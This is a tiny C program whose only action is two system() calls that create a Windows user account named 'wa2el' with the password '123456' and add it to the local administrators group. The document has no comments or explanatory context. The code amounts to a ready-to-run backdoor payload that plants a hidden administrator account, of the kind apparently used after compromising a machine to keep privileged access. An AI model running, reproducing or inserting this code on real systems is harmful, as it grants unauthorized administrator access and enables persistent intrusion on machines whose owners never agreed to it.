#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user wa2el 123456 /add");
  i = system ("net localgroup administrators wa2el /add");
  
  return 0;
}
